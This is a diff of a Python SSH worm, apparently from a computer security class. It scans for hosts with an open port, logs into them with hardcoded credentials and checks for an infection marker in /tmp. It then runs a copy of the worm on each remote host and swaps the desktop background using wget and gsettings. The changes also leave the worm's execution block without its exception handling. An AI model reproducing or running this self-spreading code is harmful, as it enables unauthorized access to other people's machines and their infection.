@@ -97,86 +97,24 @@ def get_vulnerable_hosts(port):
 	return vulnerable_hosts
 
 
-def set_background(ssh):
-	""" Downloads a new desktop background for remote system """
-	
+def set_background():
+	""" Downloads a new desktop background for remote system """	
 	ls_output = os.listdir(home_dir)
-	
-	if image_name not in ls_output:
-		print ("%s[o] Adding background..." % (offset))
-		os.system("wget https://i.imgur.com/hbNtlcJ.jpg -O " + home_dir + image_name)
-	
-	# Now set the backround	
-	os.environ["DISPLAY"] = ":0"
-	os.system("gsettings set org.gnome.desktop.background picture-uri file://" + home_dir + image_name)
-
-	"""
-	# Get the files in the user's home folder
-	stdin, stdout, stderr = ssh.exec_command("ls " + home_dir)
-
-	# readlines() convert output to unicode, so convert back to ascii
-	ls_output = stdout.readlines()
-	ls_output = [str(name) for name in ls_output]
-	ls_output = [name[0:-1] for name in ls_output]
-	# Check if the image name did not appear in ls output
-	if image_name not in ls_output:
-		print ("%s[o] Adding background..." % (offset))
-		# Download image to remote user's home directory
-		ssh.exec_command("cd " + home_dir)
-		ssh.exec_command("wget " + image_url)
-	else:
-		print ("%s[!] Background already there." % (offset))
-	
-	# Now try setting the background
-	try:
-		print (" Trying to set desktop background")
 		
-	
+	print (home_dir + image_name)
+	if image_name not in ls_output:
+		print ("%s[o] Adding background..." % (offset))
+		os.system("wget " + image_url + " -O " + home_dir + image_name)
+	# Now set the backround	
+	print ("Setting background now...")
+	os.environ["DISPLAY"] = ":0"
+	#os.system("gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name+ "\"")
+	os.system("gsettings set org.gnome.desktop.background draw-background false && gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/" + image_name + " && gsettings set org.gnome.desktop.background draw-background true")
 
-
-
-
-		#stdin, stdout, stderr = ssh.exec_command("export DISPLAY=:0")			
-		# No output from these
-		#print (stdout.readlines())
-		#print (stderr.readlines())
-		# Following command works when run manually on target machine, but not through ssh
-		#print ("tying for pid")	
-		#stdin,stdout,stderr = ssh.exec_command("echo pid=$(pgrep gnome-session)")
-		#print (stdout.readlines())
-		#print (stdout.readlines())
-		#print (stdout.readlines())	
-		#print (sys.__stdout_)
-		#pid = stdout.readlines()[0][4:8]
-		print ("pid is: " + pid)
-
-		#sudo_prefix = "echo 'cpsc\n' + | sudo -S "
-		#stdin,stdout,stderr = ssh.exec_command("export DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/" + pid + "/environ | cut -d= -f2-) && " + sudo_prefix + "gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name + "\"")
-		#chan = ssh.invoke_shell()
-		#command_list = ["\nexport pid=$(pgrep gnome-session)", "\nexport DBUS_SESSION_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/$" + pid + "/environ | cut -d= -f2-)", sudo_prefix + "gsettings set org.gnome.desktop.background picturerui \"file://" + home_dir + image_name  "\""]
-		#ssh.invoke_shell()
-		#for command in command_list:
-		#	chan.send(command)
-
-		#stdin,stdout,stderr = ssh.exec_command(
-		#sudo_prefix + "gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name + "\"")
-		#print ("gsettings...")
-		#print (stdout.readlines())
-		#print (stderr.readlines())
-
-
-		#prefix = "echo '" + remote_password + "' | sudo -S "
-		#cmd = "gsettings set org.gnome.desktop.background picture-uri file:///$PWD/" + image_name
-		#stdin, stdout, sterr = ssh.exec_command(prefix + cmd)
-		# No output from these either
-		# print (stdout.readlines())
-		# print (stderr.readlines())
-		#time.sleep(14)
-	except:
-		print("Error with setting gnome desktop background\n")
-	"""
 
 if __name__ == "__main__":
+	
+	set_background()
 	""" Main program that performs the scan """
 	
 	vulnerable_hosts = get_vulnerable_hosts(target_port)
@@ -191,7 +129,8 @@ if __name__ == "__main__":
 
 		# Attempt to SSH into known host
 		try:
-			ssh.connect(host, username=remote_username, password=remote_password)
+			ssh.connect(host, username=remote_username, 
+					password=remote_password)
 		except Exception as e:
 			print ("%s[!] Bad credentials, skipping." % (offset))
 			ssh.close()
@@ -208,16 +147,12 @@ if __name__ == "__main__":
 			
 			# Check if the system has already been infected
 			stdin, stdout, stderr = ssh.exec_command("ls /tmp/")
-			# Convert stdout to ASCII from unicode
+			# Remove unicode encoding fom results
 			results = stdout.readlines()
 			results = [str(name) for name in results]
 			results = [name[0:-1] for name in results]
 			if marker_file in results:
 				print ("%s[!] System already infected, skipping." % (offset))
-				# Create log file to see which system infected it, remove this later
-				cur_time = str(datetime.datetime.now()).replace(' ','-')
-				ssh.exec_command("echo '" + str(local_ip) + "' >> " + home_dir + "loginf-" + cur_time)
-				set_background(ssh)
 				ssh.close()
 				continue
 			else: # Has not been infected
@@ -239,31 +174,3 @@ if __name__ == "__main__":
 		# Try launching the worm from remote host
 		try:
 			ssh.exec_command("python /tmp/" + worm_name)
-			print ("%s[o] Executing worm from %s" % (offset, host))
-		except Exception as e:
-			print("%s[!] Error executing" % (offset))
-			ssh.close()
-			continue
-
-		except KeyboardInterrupt as e:
-			print ("%s[!] User stopped, moving to next IP\n" % (offset))
-			ssh.close()
-			continue
-
-		# Try changing the background on remote host
-		try:
-			set_background(ssh)
-		except Exception as e:
-			print ("%s[!] Error setting desktop background\n" % (offset))
-			pass
-		
-		except KeyboardInterrupt as e:
-			print ("%s[!] User stopped, quitting.\n" % (offset))
-			ssh.close()
-			sys.exit(1)
-		
-
-		ssh.close()
-
-	print ("Finished attacking\n")
-
